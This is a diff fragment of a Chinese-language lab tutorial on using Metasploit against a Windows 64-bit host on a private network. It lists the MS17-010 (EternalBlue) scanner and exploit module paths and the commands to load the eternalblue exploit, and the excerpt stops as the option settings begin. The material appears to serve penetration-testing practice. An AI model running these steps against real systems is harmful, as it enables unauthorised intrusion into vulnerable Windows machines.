@@ -13,13 +13,15 @@ win64:	192.168.19.2（防火墙允许文件与打印机共享)
 
 ## 使用msf框架攻击win64
 `msfconsole` /进入msf> \
-`version` /确保MS框架版本在 4.14.17以上,否则请apt-get install,search search ms17_010 \
-漏洞模块路径查询，搜索到了 4 个相关的插件： \
+`version` /确保MS框架版本在 4.14.17以上,否则请apt-get install \
+ \
+search search ms17_010 /漏洞模块路径查询，搜索到了 4 个相关的插件： \
 `auxiliary/admin/smb/ms17_010_command` \
 `auxiliary/scanner/smb/smb_ms17_010` \
 `exploit/windows/smb/ms17_010_eternalblue` \
 `exploit/windows/smb/ms17_010_psexec` \
 其中前2个插件是auxiliary下的，属于辅助验证程序,用来扫描的。3和4是exploit下的,用来攻击。 \
+ \
 注意到,msf的模块目录是在/usr/share/metasploit-framework/modules \
 `use exploit/windows/smb/ms17_010_eternalblue`   /调用攻击模块 \
 `options` /查看参数,并设置： \
